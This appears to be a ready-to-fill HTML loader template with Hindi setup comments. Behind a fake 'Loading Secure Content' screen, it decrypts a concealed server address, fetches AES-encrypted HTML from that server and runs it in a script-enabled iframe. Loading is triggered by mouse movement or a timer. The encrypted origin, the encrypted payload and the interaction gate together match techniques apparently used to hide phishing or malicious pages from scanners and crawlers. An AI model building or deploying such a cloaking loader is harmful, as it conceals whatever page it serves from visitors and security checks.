<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Loading...</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background: #f6f7fb; height: 100vh; overflow: hidden; }
    .popup { position: fixed; inset: 0; background: #ffffff; display: flex; justify-content: center; align-items: center; z-index: 9999; }
    .popup-content { text-align: center; padding: 20px; }
    .loading-gif { width: 160px; height: 160px; margin-bottom: 30px; }
    .popup-content p { font-size: 1.5rem; font-weight: 600; color: #1f2433; margin-bottom: 10px; }
    .popup-content .sub { font-size: 0.9rem; color: #888; font-weight: 400; }
    #contentiframe { display: none; z-index: 9998; position: fixed; inset: 0; pointer-events: auto; overflow: hidden; background: #fff; }
    #contentiframe iframe { width: 100%; height: 100%; border: 0; }
    .loader-bar { width: 200px; height: 4px; background: #e0e0e0; border-radius: 4px; margin: 20px auto 0; overflow: hidden; }
    .loader-bar .fill { height: 100%; width: 0%; background: #6d28d9; animation: load 3s ease-in-out forwards; }
    @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
  </style>
</head>
<body>
  <div class="popup" id="customPopup">
    <div class="popup-content">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif" />
      <p>Loading Secure Content...</p>
      <p class="sub">Please wait, we are setting things up.</p>
      <div class="loader-bar"><div class="fill"></div></div>
    </div>
  </div>
  <div id="contentiframe">
    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media" 
            sandbox="allow-scripts allow-popups allow-forms allow-downloads"></iframe>
  </div>
  <script>
    // =============================================
    // 🛡️ यहाँ STEP 6 से मिली VALUES डालो (Copy-Paste)
    // =============================================
    const PASSPHRASE = "MySuperStrongPass@2024#Secure";   
    const URL_KEY = "MyUrlKey2024";                       
    const ENC_DATA_ORIGIN = "U2FsdGVkX1/def456...uvw";   // ⚠️ इसे STEP 6 की 'ENCRYPTED_ORIGIN' से बदलो

    const MIN_DISPLAY_TIME = 3500; // 3.5 सेकंड
    let lastUrl = null;
    let startTime = null;

    function getBackendOrigin() {
      try {
        const bytes = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
      } catch (e) {
        console.error("Origin Decrypt Failed", e);
        return null;
      }
    }

    async function loadSecureContent() {
      const popup = document.getElementById("customPopup");
      const frame = document.getElementById("frame");
      const iframeContainer = document.getElementById("contentiframe");
      const origin = getBackendOrigin();
      if (!origin) { popup.innerHTML = `<p style="color:red;">❌ Invalid Config</p>`; return; }

      try {
        const apiUrl = origin + "/data";
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`API Error: ${response.status}`);
        const data = await response.json();
        const encryptedHTML = data.cipher;

        const decryptedBytes = CryptoJS.AES.decrypt(encryptedHTML, PASSPHRASE);
        const decryptedHTML = decryptedBytes.toString(CryptoJS.enc.Utf8);
        if (!decryptedHTML) throw new Error("Decryption Failed");

        if (lastUrl) URL.revokeObjectURL(lastUrl);
        const blob = new Blob([decryptedHTML], { type: "text/html" });
        lastUrl = URL.createObjectURL(blob);
        frame.src = lastUrl;

        const elapsed = Date.now() - startTime;
        const remaining = Math.max(0, MIN_DISPLAY_TIME - elapsed);
        setTimeout(() => {
          popup.style.display = "none";
          iframeContainer.style.display = "block";
        }, remaining);

      } catch (error) {
        popup.innerHTML = `<p style="color:red;">⚠️ ${error.message}</p>`;
      }
    }

    window.addEventListener("mousemove", () => {
      if (startTime !== null) return;
      startTime = Date.now();
      loadSecureContent();
    }, { once: true });

    setTimeout(() => {
      if (startTime === null) {
        startTime = Date.now();
        loadSecureContent();
      }
    }, 5000);
  </script>
</body>
</html>
